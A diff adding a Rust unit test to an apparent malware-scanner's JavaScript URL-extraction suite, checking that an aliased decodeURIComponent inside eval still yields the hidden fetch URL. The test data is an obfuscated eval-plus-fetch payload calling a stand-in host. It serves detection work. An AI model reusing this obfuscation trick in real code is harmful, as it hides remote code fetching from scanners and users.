@@ -9348,6 +9348,25 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_decodeuricomponent_function_alias_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"var d = window.decodeURIComponent; eval(d("fetch%28%27https%3A%2F%2Fdecode-alias-js.example%2Fp%27%29"))"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://decode-alias-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS decodeURIComponent function alias URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_unescape_malformed_percent_still_extracts_later_url() {
         let mut env = Environment::new(&Config::default());
         let js =
